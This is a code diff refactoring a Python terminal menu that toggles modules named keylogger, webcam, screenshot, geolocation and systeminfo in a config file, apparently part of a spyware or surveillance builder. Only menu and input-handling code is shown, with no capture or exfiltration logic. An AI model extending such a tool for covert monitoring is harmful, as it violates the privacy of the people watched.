@@ -1,7 +1,8 @@
 from configuration import configpar as cp
-from common import tools
-import menu_main
+from common import cprinter
+import main_menu
 from resources import constant
+from common import cginput
 
 menu ="""\033[92m[tools_menu]\033[0m
 modules running:
@@ -30,34 +31,36 @@ def format_tool(tool_key, num):
         return num + stry + '\033[91m disabled \033[0m'
 
 
-valid_options = [0, 1, 2, 3, 4, 5]
 
-
-def show_menu():
-    tools.clean_terminal()
+def show():
+    pr = cprinter.Printer()
     updated = load_tools_values()
+    gInput = cginput.Ginput([0, 1, 2, 3, 4, 5])
+
+    pr.clean_terminal()
     print(menu.format(updated))
-    option = tools.read_input()
-    while not valid_options.__contains__(option):
-        tools.print_error()
-        option = tools.read_input()
+
+    option = gInput.read()
+
+    while not gInput.valid_options.__contains__(option):
+        pr.error("That module doesn't exist")
+        option = gInput.read()
     while option != 0:
-        if option == constant.const.GEOLOCATION:
+        if option == constant.GEOLOCATION:
             cp.config_switch_key('tools', 'geolocation')
-            show_menu()
-        if option == constant.const.KEYLOGGER:
+            show()
+        if option == constant.KEYLOGGER:
             cp.config_switch_key('tools', 'keylogger')
-            show_menu()
-        if option == constant.const.SCREENSHOT:
+            show()
+        if option == constant.SCREENSHOT:
             cp.config_switch_key('tools', 'screenshot')
-            show_menu()
-        if option == constant.const.SYSTEMINFO:
+            show()
+        if option == constant.SYSTEMINFO:
             cp.config_switch_key('tools', 'systeminfo')
-            show_menu()
-        if option == constant.const.WEBCAM:
+            show()
+        if option == constant.WEBCAM:
             cp.config_switch_key('tools', 'webcam')
-            show_menu()
-        if option == constant.const.MAIN_MENU:
+            show()
+        if option == constant.MAIN_MENU:
             break
-            exit()
-    menu_main.show_menu()
+    main_menu.show()
